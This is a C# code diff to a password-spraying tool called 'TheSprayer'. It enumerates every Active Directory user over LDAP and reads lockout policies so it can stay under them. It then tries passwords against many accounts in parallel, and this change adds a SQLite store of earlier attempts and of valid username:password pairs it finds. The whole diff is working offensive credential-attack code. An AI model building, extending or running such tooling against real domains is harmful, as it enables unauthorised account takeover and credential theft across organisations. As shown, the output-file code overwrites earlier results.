@@ -8,10 +8,11 @@ using System.Linq;
 using TheSprayer.Helpers;
 using System.Threading.Tasks;
 
-namespace TheSprayer
+namespace TheSprayer.Services
 {
     public class ActiveDirectoryService
     {
+        private readonly SqliteService _sqlService;
         private readonly string _domain;
         private readonly string _domainUser;
         private readonly string _domainUserPass;
@@ -32,6 +33,8 @@ namespace TheSprayer
                 _distinguishedName += $"dc={split},";
             }
             _distinguishedName = _distinguishedName.TrimEnd(',');
+
+            _sqlService = new SqliteService();
         }
 
         /// <summary>
@@ -143,8 +146,8 @@ namespace TheSprayer
             int pageCount = 0;
             // Get specific attributes. There's a heap that aren't relevant and when there are tons of users it will lessen the load on the DC
             string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "badPasswordTime", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO", "userAccountControl" };
+            
             // LDAP Filter to get all domain users. This needs to be modified but works for testing.
-
             string filter = "(&(objectCategory=person)(objectClass=user))";
 
             // Initiate a new LDAP connection.
@@ -219,12 +222,15 @@ namespace TheSprayer
             return !Convert.ToBoolean(userAccountControlValue & 0x0002);
         }
 
-        public void SprayPasswords(IEnumerable<string> passwords, IEnumerable<string> usersToSpray = null, int attemptsToLeave = 2, string outputFile = null, bool force = false)
+        public void SprayPasswords(
+            IEnumerable<string> passwords, IEnumerable<string> usersToSpray = null, int attemptsToLeave = 2, 
+            string outputFile = null, bool continuous = false, bool noDb = false, bool force = false //TODO: Implement continuous
+        )
         {
             var defaultPasswordPolicy = GetPasswordPolicy();
             var fineGrainedPasswordPolicies = GetFineGrainedPasswordPolicy();
             var users = GetAllDomainUsers();
-
+            
             //Filter users down to the list passed in (if any)
             if (usersToSpray != null)
             {
@@ -245,7 +251,7 @@ namespace TheSprayer
             }
             else
             {
-                Console.WriteLine("Filtering disabled and nearly locked users...");
+                Console.WriteLine("Filtering disabled, nearly locked and users that have already had this password sprayed...");
                 foreach (var user in users)
                 {
                     if (ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
@@ -255,6 +261,12 @@ namespace TheSprayer
                 }
             }
 
+            //Get the previous attempts for these users, we don't want to double-spray passwords
+            Dictionary<string, List<CredentialAttempt>> previousSprays = new Dictionary<string, List<CredentialAttempt>>();
+            if (!noDb)
+            {
+                previousSprays = _sqlService.GetSprayAttemptsForUsers(filteredUsers.Select(u => u.SamAccountName));
+            }
             foreach (var password in passwords)
             {
                 //If we have no more users, don't continue
@@ -271,16 +283,29 @@ namespace TheSprayer
                     new ParallelOptions { MaxDegreeOfParallelism = 1000 }, 
                     user =>
                     {
+                        //Skip user if they've previously been sprayed according to the db
+                        if (previousSprays.ContainsKey(user.SamAccountName) && previousSprays[user.SamAccountName].Any(a => a.Password == password))
+                        {
+                            return;
+                        }
+
+                        //Test the credentials
                         if (TryValidateCredentials(user.SamAccountName, password))
                         {
                             ColorConsole.WriteLine($"{user.SamAccountName}:{password}");
                             if (!string.IsNullOrWhiteSpace(outputFile))
                             {
+                                //Avoid simultaniously editing the file and losing results
                                 lock (outputFile)
                                 {
                                     using var sw = System.IO.File.CreateText(outputFile);
                                     sw.WriteLine($"{user.SamAccountName}:{password}");
                                 }
+                            }
+
+                            if (!noDb)
+                            {
+                                _sqlService.SaveCredentialPair(user.SamAccountName, password);
                             }
                         }
                         else //Increment users bad password attempts and remove if close to lockout
